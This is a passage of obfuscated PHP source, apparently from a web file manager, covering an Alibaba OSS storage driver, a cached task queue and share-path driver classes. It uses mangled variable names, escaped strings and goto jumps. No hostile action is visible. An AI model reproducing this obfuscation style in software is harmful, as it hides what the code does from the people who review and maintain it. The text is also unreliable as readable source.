$‚·ÖÖø¼[284]))); ksort($‰À™ç¿); $¨¢ß°ÅÃ = $‰À™ç¿ ? $‚·ÖÖø¼[76] . http_build_query($‰À™ç¿, null, $‚·ÖÖø¼[287], PHP_QUERY_RFC3986) : $‚·ÖÖø¼[12]; $÷Øº‚¹³ = array($ö¡ñŞöô, $‚·ÖÖø¼[12], $‚·ÖÖø¼[123], $Ÿ®®†à‹, "\170\x2d\157\x73\163\x2d\x64\141\x74\145\x3a{$Ÿ®®†à‹}", $‚·ÖÖø¼[8] . $this->bucket . $‚·ÖÖø¼[8] . $õáŞ”£ . $¨¢ß°ÅÃ); if (isset($Ô€ù²òÃ[$‚·ÖÖø¼[286]])) { $ƒ¯ö”Ã½ = $this->trafficLimit($‚·ÖÖø¼[1522], array(), !0); if ($ƒ¯ö”Ã½) { $õáŞ”£ = $‚·ÖÖø¼[1530]; array_splice($÷Øº‚¹³, 5, 0, $õáŞ”£ . $‚·ÖÖø¼[4] . $ƒ¯ö”Ã½[$õáŞ”£]); } } $ó–ÇÃıÊ = implode($‚·ÖÖø¼[288], $÷Øº‚¹³); $ú–ˆÇç = base64_encode(hash_hmac($‚·ÖÖø¼[1447], $ó–ÇÃıÊ, $this->secret, !0)); $Æ¾àË÷ = $‚·ÖÖø¼[1499] . $this->accessKey . $‚·ÖÖø¼[4] . $ú–ˆÇç; $Ô¶Íñêá = array($‚·ÖÖø¼[289] => $Æ¾àË÷, $‚·ÖÖø¼[285] => $Ÿ®®†à‹); if (!empty($ƒ¯ö”Ã½)) { $Ô¶Íñêá = array_merge($Ô¶Íñêá, $ƒ¯ö”Ã½); } return $Ô¶Íñêá; } public function download($‘Û”öµ™, $ŠÀÔ¬Œ) { $È­³ıô¹ =& $_SERVER[ÓïÕü]; if ($this->isFolder($‘Û”öµ™)) { return !1; } try { $â¨Íì¿Œ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ŠÀÔ¬Œ); $â¨Íì¿Œ = $this->trafficLimit($È­³ıô¹[112], $â¨Íì¿Œ); $this->client->getObject($this->bucket, $this->pathEncode($‘Û”öµ™), $â¨Íì¿Œ); } catch (OSS\Core\OssException $û×Ùˆ³ä) { $this->writeLog(__FUNCTION__ . $È­³ıô¹[215] . $û×Ùˆ³ä->getMessage()); return !1; } return $ŠÀÔ¬Œ; } public function fileSubstr($»›©Î¥, $ıÑ´£¹Ê = 0, $Ü•£¨ü = false) { if ($ıÑ´£¹Ê === -1) { $›¼ƒÊ£è = array(); } else { if ($Ü•£¨ü === !1) { $¡Öß“Á¼ = $this->size($»›©Î¥); } else { $¡Öß“Á¼ = $ıÑ´£¹Ê + $Ü•£¨ü - 1; } $›¼ƒÊ£è = array(OSS\OssClient::OSS_RANGE => "{$ıÑ´£¹Ê}\x2d{$¡Öß“Á¼}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($»›©Î¥), $›¼ƒÊ£è); } catch (OSS\Core\OssException $ŞÎÎÚ§Ó) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][215] . $ŞÎÎÚ§Ó->getMessage()); think_exception($ŞÎÎÚ§Ó->getMessage()); return !1; } } private function trafficLimit($á•ÍÕ‹÷, $ùä¬Ùì“ = array(), $åˆ®ìã = false) { $¢£¤‡ =& $_SERVER[ÓïÕü]; if ($á•ÍÕ‹÷ == $¢£¤‡[1522] && $this->isUploadServer() || $á•ÍÕ‹÷ == $¢£¤‡[112] && $this->isFileOutServer()) { return $ùä¬Ùì“; } $–èı½¬Ì = floatval($GLOBALS[$¢£¤‡[6]][$¢£¤‡[92]][$¢£¤‡[110]][$á•ÍÕ‹÷]) * 1024 * 1024 * 8; if (!$–èı½¬Ì) { return $ùä¬Ùì“; } $–èı½¬Ì = $–èı½¬Ì < 819200 ? 819200 : ($–èı½¬Ì > 838860800 ? 838860800 : $–èı½¬Ì); if ($åˆ®ìã) { $ùä¬Ùì“[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($–èı½¬Ì); } else { if (!isset($ùä¬Ùì“[OSS\OssClient::OSS_HEADERS])) { $ùä¬Ùì“[OSS\OssClient::OSS_HEADERS] = array(); } $ùä¬Ùì“[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($–èı½¬Ì); } return $ùä¬Ùì“; } public function link($Ö™‘±ò¦, $×²Ö‚“ = array()) { $ï—¡şÀ¯ =& $_SERVER[ÓïÕü]; if (!$this->exist($Ö™‘±ò¦) || $this->isFolder($Ö™‘±ò¦)) { return !1; } try { $×²Ö‚“ = $this->trafficLimit($ï—¡şÀ¯[112], $×²Ö‚“, !0); $¼¸à¸Ùö = $this->client->signUrl($this->bucket, $this->pathEncode($Ö™‘±ò¦), 3600 * 12, $ï—¡şÀ¯[1531], $×²Ö‚“); return $this->getCdnLink($¼¸à¸Ùö); } catch (OSS\Core\OssException $Õ•åèÈÏ) { $this->writeLog(__FUNCTION__ . $ï—¡şÀ¯[215] . $Õ•åèÈÏ->getMessage()); return !1; } } public function fileOut($¬ Û·Î, $î–…ºŞš = false, $àœ¡ô° = false, $‹æ¢…² = '') { $´µâğ™ô =& $_SERVER[ÓïÕü]; if ($this->isFileOutServer()) { return $this->fileOutServer($¬ Û·Î, $î–…ºŞš, $àœ¡ô°, $‹æ¢…²); } if (!$àœ¡ô°) { $àœ¡ô° = $this->pathThis($¬ Û·Î); } $àœ¡ô° = rawurlencode($àœ¡ô°); $º‘¥«‰ = get_file_mime(get_path_ext($àœ¡ô°)); if ($º‘¥«‰ == $´µâğ™ô[251]) { return parent::fileOut($¬ Û·Î, $î–…ºŞš, $àœ¡ô°, $‹æ¢…²); } $î–…ºŞš = $î–…ºŞš ? $´µâğ™ô[1532] : $´µâğ™ô[1533]; $ˆı…çû = array(OSS\OssClient::OSS_SUB_RESOURCE => $´µâğ™ô[1534] . rawurlencode("{$î–…ºŞš}\73\x66\x69\x6c\145\156\x61\155\x65\x3d{$àœ¡ô°}")); $¼¦¿”¾Ì = $this->link($¬ Û·Î, $ˆı…çû); $this->fileOutLink($¼¦¿”¾Ì); } public function fileOutServer($’³Ù¦Ô, $é²âÜŒ  = false, $ø™¸ìşş = false, $§İÇëÚˆ = '') { parent::fileOut($’³Ù¦Ô, $é²âÜŒ , $ø™¸ìşş, $§İÇëÚˆ); } public function fileOutImage($ü…€Ï—Ú, $¡Ô¦ø¥Í = 250) { if ($this->size($ü…€Ï—Ú) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ü…€Ï—Ú, $¡Ô¦ø¥Í); } $ØØ£ˆ©Ç = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÓïÕü][1496] . $¡Ô¦ø¥Í); $¤¾¯”¯ = $this->link($ü…€Ï—Ú, $ØØ£ˆ©Ç); $this->fileOutLink($¤¾¯”¯); } public function fileOutImageServer($€‚îªÄŞ, $°ãœ½‹² = 250) { parent::fileOutImage($€‚îªÄŞ, $°ãœ½‹²); } public function fileOutLink($”ÇÉÄ÷Á) { $èÏÏïÂ¸ =& $_SERVER[ÓïÕü]; if (!$this->isCdnHost() && substr($”ÇÉÄ÷Á, 0, 7) == $èÏÏïÂ¸[219]) { $”ÇÉÄ÷Á = $èÏÏïÂ¸[220] . substr($”ÇÉÄ÷Á, 7); } header($èÏÏïÂ¸[175] . $”ÇÉÄ÷Á); die; } public function hashMd5($›óàëàÄ, $´·í = '') { $Öğ…ÔÃ =& $_SERVER[ÓïÕü]; $’±À”†‚ = $this->_objectMeta($›óàëàÄ); if (!$’±À”†‚) { return $Öğ…ÔÃ[12]; } if (!isset($’±À”†‚[$Öğ…ÔÃ[1516]]) && !empty($´·í)) { $ŞÓÒ¶µí = $this->updateObjMeta($›óàëàÄ, array($Öğ…ÔÃ[1516] => $´·í)); $’±À”†‚[$Öğ…ÔÃ[1516]] = $ŞÓÒ¶µí ? $´·í : $Öğ…ÔÃ[12]; } return isset($’±À”†‚[$Öğ…ÔÃ[1516]]) ? strtolower($’±À”†‚[$Öğ…ÔÃ[1516]]) : $Öğ…ÔÃ[12]; } public function size($ÇÈªŞ®¿) { $¿˜ë³ = $this->objectMeta($ÇÈªŞ®¿); return $¿˜ë³ ? $¿˜ë³[$_SERVER[ÓïÕü][79]] : 0; } public function info($ñ”¤³‰¤) { if ($this->isFolder($ñ”¤³‰¤)) { return $this->folderInfo($ñ”¤³‰¤); } else { if ($this->isFile($ñ”¤³‰¤)) { return $this->fileInfo($ñ”¤³‰¤); } } return !1; } public function exist($ñ±á·¤ú) { return $this->isFile($ñ±á·¤ú) || $this->isFolder($ñ±á·¤ú); } public function isFile($ÉŒÅ¼ñò) { return !$this->isFolder($ÉŒÅ¼ñò) && $this->objectMeta($ÉŒÅ¼ñò); } public function isFolder($Õ¤Ä³±Ê) { return $this->cacheMethod($_SERVER[ÓïÕü][180], $Õ¤Ä³±Ê); } protected function objectMeta($‡¢¿“ş·) { return $this->cacheMethod($_SERVER[ÓïÕü][182], $‡¢¿“ş·); } protected function _objectMeta($ßÙÇŸ–) { $ì¡ş×†Î =& $_SERVER[ÓïÕü]; try { $ÅÒœäâ² = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ßÙÇŸ–)); } catch (OSS\Core\OssException $å§ù…ØÌ) { $this->writeLog(__FUNCTION__ . $ì¡ş×†Î[215] . $å§ù…ØÌ->getMessage()); $ÅÒœäâ² = !1; } if ($ÅÒœäâ²) { $ÅÒœäâ²[$ì¡ş×†Î[79]] = intval($ÅÒœäâ²[$ì¡ş×†Î[1514]]); } return $ÅÒœäâ²; } protected function _isFolder($ıÀ¡¯¬ô) { $º†âÃæ =& $_SERVER[ÓïÕü]; if ($ıÀ¡¯¬ô == $º†âÃæ[12] || $ıÀ¡¯¬ô == $º†âÃæ[8]) { return !0; } $ Ó²¯ÜË = array($º†âÃæ[1509] => $º†âÃæ[8], $º†âÃæ[1510] => rtrim($ıÀ¡¯¬ô, $º†âÃæ[8]) . $º†âÃæ[8], $º†âÃæ[1511] => 1, $º†âÃæ[1512] => $º†âÃæ[12]); $éâ·ÓŒ¹ = $this->client->listObjects($this->bucket, $ Ó²¯ÜË); if ($éâ·ÓŒ¹->getObjectList() || $éâ·ÓŒ¹->getPrefixList()) { return !0; } return !1; } public function writeLog($ìÑ¿ç•“ = '', $ïÜÌ™£ = false) { $¿…Üøòò =& $_SERVER[ÓïÕü]; $øîŒÆ¬ş = in_array(ACTION, array($¿…Üøòò[213], $¿…Üøòò[214])); if (!$øîŒÆ¬ş && !GLOBAL_DEBUG) { return; } $òá¾Ä‘ù = 0; if (stripos($ìÑ¿ç•“, $¿…Üøòò[1535]) !== !1) { $òá¾Ä‘ù = 1; $Ò™ôÎÈü = explode($¿…Üøòò[1536], $ìÑ¿ç•“); $ìÑ¿ç•“ = !empty($Ò™ôÎÈü[1]) ? $Ò™ôÎÈü[1] : $ìÑ¿ç•“; } else { if (stripos($ìÑ¿ç•“, $¿…Üøòò[1537])) { $òá¾Ä‘ù = 2; $Ò™ôÎÈü = explode($¿…Üøòò[1537], $ìÑ¿ç•“); $Ò™ôÎÈü = explode($¿…Üøòò[4], $Ò™ôÎÈü[0]); $ìÑ¿ç•“ = !empty($Ò™ôÎÈü[1]) ? $Ò™ôÎÈü[1] : $ìÑ¿ç•“; } } if ($øîŒÆ¬ş && I18n::getType() == $¿…Üøòò[1538]) { if ($òá¾Ä‘ù == 1) { $ìÑ¿ç•“ = str_replace($¿…Üøòò[1539], $¿…Üøòò[1540], $ìÑ¿ç•“); } else { if ($òá¾Ä‘ù == 2) { $Ò™ôÎÈü = explode($¿…Üøòò[215], $Ò™ôÎÈü[0]); $š¹ãüÔ = isset($Ò™ôÎÈü[1]) ? $Ò™ôÎÈü[1] : $¿…Üøòò[12]; $Ñµ¤—Ö€ = array($¿…Üøòò[1541] => $¿…Üøòò[1542], $¿…Üøòò[1543] => $¿…Üøòò[1544], $¿…Üøòò[1545] => $¿…Üøòò[1546], $¿…Üøòò[1547] => $¿…Üøòò[1548], $¿…Üøòò[1549] => $¿…Üøòò[1550], $¿…Üøòò[1551] => $¿…Üøòò[1552], $¿…Üøòò[1553] => $¿…Üøòò[1554], $¿…Üøòò[1555] => $¿…Üøòò[1556], $¿…Üøòò[1557] => $¿…Üøòò[1558], $¿…Üøòò[1559] => $¿…Üøòò[1560]); if (isset($Ñµ¤—Ö€[$š¹ãüÔ])) { $ìÑ¿ç•“ = $Ñµ¤—Ö€[$š¹ãüÔ]; } } } if (stripos($ìÑ¿ç•“, $¿…Üøòò[1561])) { $ìÑ¿ç•“ = $¿…Üøòò[1562]; } } if (!trim($ìÑ¿ç•“)) { return; } parent::writeLog(trim($ìÑ¿ç•“), $ïÜÌ™£); } } goto c…“ÁÍĞÅ; bäêŒ¼ä‡Õ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\x51\165\x65\165\145\x4c\145\x6e\147\164\150"; const QUEUE_DATA = "\x74\141\x73\153\121\165\145\x75\145\x44\141\164\x61"; const QUEUE_TIME = "\x74\141\163\x6b\x51\x75\145\165\145\x4c\x61\163\164\122\x75\x6e"; const QUEUE_THREAD = "\x74\141\x73\153\x51\x75\x65\165\145\x54\150\162\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($…Üğ˜òÉ, $³š“ò±İ = array(), $Ãüığ = '', $¿µï®Ù = '') { $‚‡ß£œÍ =& $_SERVER[ÓïÕü]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¿µï®Ù && array_find_by_field(self::$listData, $‚‡ß£œÍ[97], $¿µï®Ù)) { return !0; } if ($¿µï®Ù && array_find_by_field(self::$listDataAdd, $‚‡ß£œÍ[97], $¿µï®Ù)) { return !0; } self::$listDataAdd[] = array($‚‡ß£œÍ[344] => $…Üğ˜òÉ, $‚‡ß£œÍ[1906] => $³š“ò±İ, $‚‡ß£œÍ[529] => $Ãüığ, $‚‡ß£œÍ[97] => $¿µï®Ù); return !0; } public static function addSubmit() { $Éıûµ—Ö =& $_SERVER[ÓïÕü]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Éıûµ—Ö[1907] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Éıûµ—Ö[12], $Éıûµ—Ö[529])), $Éıûµ—Ö[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($á¯âÂ©š, $ì›»í«¶ = array(), $ÉÒá¼åä = '', $§¡ĞŞä = '') { $Á±±‚õÉ =& $_SERVER[ÓïÕü]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ëöö”‹ = self::getAll(); if ($§¡ĞŞä && array_find_by_field($ëöö”‹, $Á±±‚õÉ[97], $§¡ĞŞä)) { return !0; } $ëöö”‹[] = array($Á±±‚õÉ[344] => $á¯âÂ©š, $Á±±‚õÉ[1906] => $ì›»í«¶, $Á±±‚õÉ[529] => $ÉÒá¼åä, $Á±±‚õÉ[97] => $§¡ĞŞä); self::setAll($ëöö”‹); write_log($Á±±‚õÉ[1907] . $ÉÒá¼åä, $Á±±‚õÉ[198]); return !0; } public static function run() { $Õ›¹¢¦¶ =& $_SERVER[ÓïÕü]; $¨ë„ü±æ = self::getAll(); $ÄÀõâ©À = array_shift($¨ë„ü±æ); if (!$ÄÀõâ©À) { return !1; } self::setAll($¨ë„ü±æ); $Ç­şù×Ï = timeFloat(); $õÄ¸ÓïÊ = $Õ›¹¢¦¶[12]; try { $õÄ¸ÓïÊ = Hook::apply($ÄÀõâ©À[$Õ›¹¢¦¶[344]], $ÄÀõâ©À[$Õ›¹¢¦¶[1906]]); } catch (Exception $…Ôãà­Á) { write_log($…Ôãà­Á, $Õ›¹¢¦¶[1292]); } $ã—’Ô = number_format(timeFloat() - $Ç­şù×Ï, 3) . $Õ›¹¢¦¶[1822]; if ($õÄ¸ÓïÊ && is_string($õÄ¸ÓïÊ)) { $ã—’Ô = $ã—’Ô . $Õ›¹¢¦¶[1908] . $õÄ¸ÓïÊ; } write_log($Õ›¹¢¦¶[1909] . $ÄÀõâ©À[$Õ›¹¢¦¶[529]] . $Õ›¹¢¦¶[1910] . $ã—’Ô, $Õ›¹¢¦¶[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Œ›ˆ÷µª =& $_SERVER[ÓïÕü]; $„Ğë¯ÇÌ = self::threadCount() + 1; if ($„Ğë¯ÇÌ > 3 || !self::count()) { return; } write_log($Œ›ˆ÷µª[1911] . $„Ğë¯ÇÌ, $Œ›ˆ÷µª[198]); Cache::set(self::QUEUE_THREAD, $„Ğë¯ÇÌ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Œ›ˆ÷µª[1912], $Œ›ˆ÷µª[198]); } public static function getKey($ÑŸøà©†, $’Ş³ñß¬ = "\151\156\164") { $õ§¥„“ =& $_SERVER[ÓïÕü]; Cache::removeMemory($ÑŸøà©†); $€ÁıÈ«Ñ = Cache::get($ÑŸøà©†); if ($’Ş³ñß¬ == $õ§¥„“[366]) { return $€ÁıÈ«Ñ ? intval($€ÁıÈ«Ñ) : 0; } if ($’Ş³ñß¬ == $õ§¥„“[1913]) { return is_array($€ÁıÈ«Ñ) ? $€ÁıÈ«Ñ : array(); } return $€ÁıÈ«Ñ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ÓïÕü][1913]); } public static function setAll($âìŒå×é) { $³š¦Ä¸¹ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($âìŒå×é), $³š¦Ä¸¹); Cache::set(self::QUEUE_DATA, $âìŒå×é, $³š¦Ä¸¹); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } $_file = $_SERVER[$_SERVER[ÓïÕü][931]]; $_size = $_SERVER[ÓïÕü][932]; goto c‰£¶Û¯Ä; a±éÅÜğ¤Ã: class PathDriverDbShareItem extends PathDriverDB { public function __construct($„á±’üõ) { $this->pathParse = $„á±’üõ; $this->model = Model($_SERVER[ÓïÕü][1456]); } public function getPathOuter($ª¤¨ÀùÚ) { $ÑŸäÌÎ =& $_SERVER[ÓïÕü]; if (!$ª¤¨ÀùÚ) { return $ª¤¨ÀùÚ; } $Õ—õ“äõ = $this->parse($ª¤¨ÀùÚ); return trim(KodIO::makeShare($this->pathParse[$ÑŸäÌÎ[478]], $Õ—õ“äõ[$ÑŸäÌÎ[478]]), $ÑŸäÌÎ[8]); } protected function infoParse($Ìµ½‹—”, $“¾£¬Ñæ = false, $‡ÀÑ·‹ä = false) { $ÔŞ™ ü˜ =& $_SERVER[ÓïÕü]; $Ãå¢…€à = $this->pathParse[$ÔŞ™ ü˜[478]]; $ïˆ¼òƒ = trim($this->pathParse[$ÔŞ™ ü˜[1277]], $ÔŞ™ ü˜[8]); return Action($ÔŞ™ ü˜[1463])->sharePathInfo($Ãå¢…€à, $ïˆ¼òƒ, $“¾£¬Ñæ); } public function infoFull($®ôğêÈÀ) { $Ì¹ÀÌ =& $_SERVER[ÓïÕü]; $Á¹ÒÄú‚ = explode($Ì¹ÀÌ[8], trim($®ôğêÈÀ, $Ì¹ÀÌ[8])); if (count($Á¹ÒÄú‚) > 1) { $Úåä©±´ = implode($Ì¹ÀÌ[8], array_splice($Á¹ÒÄú‚, 1)); $’¶¥õ“ = $this->model->pathInfoByPath($Á¹ÒÄú‚[0], $Úåä©±´); if (!$’¶¥õ“) { return !1; } $this->pathParse[$Ì¹ÀÌ[1277]] = $’¶¥õ“[$Ì¹ÀÌ[194]]; } return $this->infoParse($®ôğêÈÀ); } public function listAll($Ë«ú”Ôë) { $™˜à¼Äá =& $_SERVER[ÓïÕü]; $¦ÈÂéÃô = IO::info($this->pathParse[$™˜à¼Äá[87]]); if (!$¦ÈÂéÃô) { return array(); } $Ğñ¨‘Í¼ = $this->model->listAll($Ë«ú”Ôë); $ßÚëÆ± = Model($™˜à¼Äá[672])->getInfo($¦ÈÂéÃô[$™˜à¼Äá[673]]); foreach ($Ğñ¨‘Í¼ as &$±µ®“ôû) { check_abort(); $±µ®“ôû[$™˜à¼Äá[90]] = Action($™˜à¼Äá[1463])->_shareItemeParse($±µ®“ôû[$™˜à¼Äá[90]], $ßÚëÆ±); } unset($±µ®“ôû); return $Ğñ¨‘Í¼; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($®·âÜ¸Õ) { $this->pathParse = $®·âÜ¸Õ; $this->model = Model($_SERVER[ÓïÕü][1456]); } protected function infoParse($ÈÂÄîâş, $‰‚·ˆ† = false, $‰À»ÅùĞ = false) { $ÛüôŸ¸Æ =& $_SERVER[ÓïÕü]; return Action($ÛüôŸ¸Æ[1284])->sharePathInfo($this->pathParse[$ÛüôŸ¸Æ[87]], !0, $‰‚·ˆ†); } public function listPath($˜óöŸøï, $¦óõº¶Ù = false) { $«±ä¦ß =& $_SERVER[ÓïÕü]; $–‘í‹¯‡ = parent::listPath($˜óöŸøï, $¦óõº¶Ù); if (!$–‘í‹¯‡) { return $–‘í‹¯‡; } if (is_array($–‘í‹¯‡[$«±ä¦ß[1464]])) { $–‘í‹¯‡[$«±ä¦ß[1464]] = Action($«±ä¦ß[1284])->shareItemInfo($–‘í‹¯‡[$«±ä¦ß[1464]]); } foreach ($–‘í‹¯‡ as $­ª‚ûÂÍ => $ï×›¼ñ) { if (!in_array($­ª‚ûÂÍ, array($«±ä¦ß[86], $«±ä¦ß[85]))) { continue; } foreach ($ï×›¼ñ as $Ñ‚åÛî‹ => $ŒÒ™Ò¦Ä) { $–‘í‹¯‡[$­ª‚ûÂÍ][$Ñ‚åÛî‹] = Action($«±ä¦ß[1284])->shareItemInfo($ŒÒ™Ò¦Ä); } } return $–‘í‹¯‡; } public function listAll($¥Öƒ‡á–) { $¦’—‹•Ñ =& $_SERVER[ÓïÕü]; $‚í¹ó = IO::info($this->pathParse[$¦’—‹•Ñ[87]]); if (!$‚í¹ó) { return array(); } $­–º¢ ç = $this->model->listAll($¥Öƒ‡á–); foreach ($­–º¢ ç as &$é™µìÌ¨) { $é™µìÌ¨[$¦’—‹•Ñ[90]] = Action($¦’—‹•Ñ[1284])->shareItemInfo($é™µìÌ¨[$¦’—‹•Ñ[90]]); } unset($é™µìÌ¨); return $­–º¢ ç; } } class PathDriverDriverShareItem { public function __construct($²ë÷şüÍ) { $this->pathParse = $²ë÷şüÍ; } public function __call($ÌÇøŸ ¼, $›Ï‚àĞ) { $—™ù£Ç´ =& $_SERVER[ÓïÕü]; if (method_exists($this, $ÌÇøŸ ¼)) { return; } $Ã‹åıŸ  = call_user_func_array(array($—™ù£Ç´[1465], $ÌÇøŸ ¼), $›Ï‚àĞ); $ìëãêªİ = array($—™ù£Ç´[1466], $—™ù£Ç´[1467], $—™ù£Ç´[1468], $—™ù£Ç´[1469], $—™ù£Ç´[626], $—™ù£Ç´[628], $—™ù£Ç´[1470], $—™ù£Ç´[110], $—™ù£Ç´[1471], $—™ù£Ç´[1472]); if (in_array($ÌÇøŸ ¼, $ìëãêªİ)) { $Ã‹åıŸ  = $this->getPathOuter($Ã‹åıŸ ); } return $Ã‹åıŸ ; } public function copy($â»îó§ş, $‰¿Ï¯Çˆ, $áâÈŠÈ = false, $ ³ï¬Œõ = false) { return $this->copyMove($â»îó§ş, $‰¿Ï¯Çˆ, $áâÈŠÈ, $_SERVER[ÓïÕü][626], $ ³ï¬Œõ); } public function move($Š†¬êæ¥, $Úî–Ğ²¿, $ş†©ÔÆÀ = false, $ˆìÏœç¢ = false) { return $this->copyMove($Š†¬êæ¥, $Úî–Ğ²¿, $ş†©ÔÆÀ, $_SERVER[ÓïÕü][628], $ˆìÏœç¢); } private function copyMove($…ä±¿¿ñ, $”ŒÂ¤, $Íâ›³ç–, $¿Éç­ß©, $µÆ›°Š° = false) { $¤ë®‚Ü­ =& $_SERVER[ÓïÕü]; $Äéºñ¢æ = $”ŒÂ¤; $¿‚ùß’î = IO::driverMake($”ŒÂ¤); if ($¿‚ùß’î->pathParse[$¤ë®‚Ü­[1259]]) { $”ŒÂ¤ = $¿‚ùß’î->pathParse[$¤ë®‚Ü­[1259]]; } else { $”ŒÂ¤ = $Äéºñ¢æ; } $ÎÊğ¤Š† = IO::copyMove($…ä±¿¿ñ, $”ŒÂ¤, $Íâ›³ç–, $¿Éç­ß©, $µÆ›°Š°); $ÎÊğ¤Š† = $this->getPathOuter($ÎÊğ¤Š†); return $ÎÊğ¤Š†; } public function pathThis($îêıù¯û) { return get_path_this($this->pathParse[$_SERVER[ÓïÕü][87]]); } public function pathFather($ú‚Şª©) { return get_path_father($this->pathParse[$_SERVER[ÓïÕü][87]]); } public function iconvSystem($­‰Å›ìó) { return $­‰Å›ìó; } protected function infoParse($Ÿ­–ºÜî, $øùâ’·Ÿ = false) { $Ü“ğËûô =& $_SERVER[ÓïÕü]; $äæ‰’¡Ÿ = $this->pathParse[$Ü“ğËûô[565]][$Ü“ğËûô[1285]] . $this->pathParse[$Ü“ğËûô[1277]]; if ($øùâ’·Ÿ) { $“ÆŒŞêÕ = IO::infoWithChildren($äæ‰’¡Ÿ); } else { $“ÆŒŞêÕ = IO::info($äæ‰’¡Ÿ); } $Ğö½Ô§™ = $this->pathParse[$Ü“ğËûô[565]]; return Action($Ü“ğËûô[1463])->_shareItemeParse($“ÆŒŞêÕ, $Ğö½Ô§™); } public function listAll($À¸†Ùì“) { $Ã…«¾´¤ =& $_SERVER[ÓïÕü]; $Ú¥ÇÊû® = IO::listAll($À¸†Ùì“); $¿ùˆáÓ½ = rtrim($this->pathParse[$Ã…«¾´¤[565]][$Ã…«¾´¤[1285]], $Ã…«¾´¤[8]); foreach ($Ú¥ÇÊû® as &$çà…Œ—µ) { $çà…Œ—µ[$Ã…«¾´¤[87]] = $this->pathDriver . $Ã…«¾´¤[8] . ltrim(substr($çà…Œ—µ[$Ã…«¾´¤[87]], strlen($¿ùˆáÓ½)), $Ã…«¾´¤[8]); } unset($çà…Œ—µ); return $Ú¥ÇÊû®; } public function listAllSimple($…îÈ¯ô, $¿¢ÂèÅÆ = false) { $ºÙˆŒË =& $_SERVER[ÓïÕü]; $¥­öıÒÀ = $this->listAll($…îÈ¯ô); $®²“óºÎ = $this->pathParse[$ºÙˆŒË[498]]; if (trim($®²“óºÎ, $ºÙˆŒË[8]) == trim(get_path_father($®²“óºÎ), $ºÙˆŒË[8])) { $¿¢ÂèÅÆ = !0; } return IO::init($ºÙˆŒË[12])->listAllSimpleMake($¥­öıÒÀ, $®²“óºÎ, $¿¢ÂèÅÆ); } public function getPathOuter($íõ¯Í¢) { $ÛåÂï… =& $_SERVER[ÓïÕü]; $Ô–ª†®å = KodIO::parse($íõ¯Í¢); if ($Ô–ª†®å[$ÛåÂï…[33]] == KodIO::KOD_SHARE_ITEM) { return $Ô–ª†®å[$ÛåÂï…[87]]; } $ğíµ«¼  = KodIO::clear($íõ¯Í¢); $Ì›Í¨ïš = KodIO::clear($this->pathParse[$ÛåÂï…[565]][$ÛåÂï…[1285]]); $–ÀŠˆİ¸ = substr($ğíµ«¼ , strlen($Ì›Í¨ïš)); if (substr($ğíµ«¼ , 0, strlen($Ì›Í¨ïš)) != $Ì›Í¨ïš) { return !1; } return $this->pathParse[$ÛåÂï…[1278]] . $ÛåÂï…[8] . ltrim($–ÀŠˆİ¸, $ÛåÂï…[8]); } public function getType() { $òöàêûı =& $_SERVER[ÓïÕü]; $¥«“ç× = str_replace($òöàêûı[77], $òöàêûı[12], get_class($this)); return strtolower($¥«“ç×); } public function isOsDriver($Ñ‘‚×¶Æ) { return IO::isOsDriver($Ñ‘‚×¶Æ); } public function info($äéƒ´Ø) { return $this->infoParse($äéƒ´Ø); } public function infoAuth($óØ‰ô¹¤) { return $this->infoParse($óØ‰ô¹¤); } public function infoWithChildren($ì–îÖ¤ç) { return $this->infoParse($ì–îÖ¤ç, !0); } public function infoFull($¼å¶€±°) { return $this->infoParse($¼å¶€±°); } } goto fÖ‘¸³³ñÉ; C­«ä¿º©©: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\x6d\x4f\160\164\151\x6f\156"; public $field = array(); public function listData($˜¸úÇÛ• = false, $ÌÚÜõğà = "\x6d\157\144\151\x66\171\x54\x69\x6d\145", $¨¯ŠÁ¾û = false) { $¦úÌê» = Model($this->modelType)->get(!1, $this->optionType, !0); $Â¿“âÇ = array_values($¦úÌê»); if ($Â¿“âÇ && $Â¿“âÇ[0] && !is_array($Â¿“âÇ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¦úÌê» = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¦úÌê») { return $˜¸úÇÛ• ? null : array(); } if (!$˜¸úÇÛ•) { $¦úÌê» = array_filter(array_values($¦úÌê»)); return array_sort_by($¦úÌê», $ÌÚÜõğà, $¨¯ŠÁ¾û); } return $¦úÌê»[$_SERVER[ÓïÕü][475] . $˜¸úÇÛ•]; } public function insert($ÉÃ¬‰š¹) { $Š¶ûì¨ =& $_SERVER[ÓïÕü]; $ÉÃ¬‰š¹ = array_field_key($ÉÃ¬‰š¹, $this->field); $õ¬‘£¹ = Model($this->modelType)->get($Š¶ûì¨[476], $this->optionType . $Š¶ûì¨[477]); 